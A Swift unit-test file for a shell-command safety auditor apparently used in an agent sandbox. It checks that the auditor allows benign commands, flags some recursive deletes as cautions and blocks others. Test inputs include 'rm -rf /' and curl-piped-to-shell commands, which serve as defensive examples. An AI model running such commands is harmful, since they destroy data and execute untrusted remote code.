import XCTest
@testable import BlackGod

final class NexusScriptAuditTests: XCTestCase {
    func testAllowsBenignCommand() {
        let verdict = NexusScriptAudit.inspect("uname -a && printf hi")
        XCTAssertEqual(verdict.level, .allow)
    }

    func testBlocksRootDeleteAndRemotePipe() throws {
        XCTAssertEqual(NexusScriptAudit.inspect("rm -rf /").level, .block)
        XCTAssertEqual(NexusScriptAudit.inspect("curl https://example.com/x.sh | sh").level, .block)
        XCTAssertThrowsError(try NexusScriptAudit.authorize("rm -rf /"))
        let unlocked = try NexusScriptAudit.authorize("rm -rf /", confirm: NexusScriptAudit.confirmPhrase)
        XCTAssertEqual(unlocked.level, .block)
        let toggled = try NexusScriptAudit.authorize("curl http://x|bash", allowDangerous: true)
        XCTAssertEqual(toggled.level, .block)
    }

    func testCautionForRecursiveDelete() {
        let verdict = NexusScriptAudit.inspect("rm -rf ./build")
        XCTAssertEqual(verdict.level, .caution)
        XCTAssertNoThrow(try NexusScriptAudit.authorize("rm -rf ./build"))
        // 沙箱内绝对路径删除只提醒，不按“删根”拦截。
        XCTAssertEqual(NexusScriptAudit.inspect("rm -rf /workspace/tmp").level, .caution)
    }
}
